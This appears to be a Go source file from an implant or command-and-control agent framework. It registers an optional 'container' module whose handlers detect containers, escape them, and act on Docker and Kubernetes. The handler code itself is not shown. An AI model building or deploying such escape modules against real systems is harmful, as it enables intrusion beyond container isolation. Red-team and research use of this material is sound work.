//go:build linux || windows || darwin
// +build linux windows darwin

package main

// Task registry: the optional "container" module (see internal/payload/agent_modules.go).
// The generator drops this file whole when the operator excludes the module;
// every entry point below disappears with it and the linker dead-codes the
// unreferenced handlers.

func init() {
	taskHandlers["container_detect"] = handleContainerDetect
	taskHandlers["container_escape"] = handleContainerEscape
	taskHandlers["container_docker"] = handleContainerDocker
	taskHandlers["container_k8s"] = handleContainerK8s
}
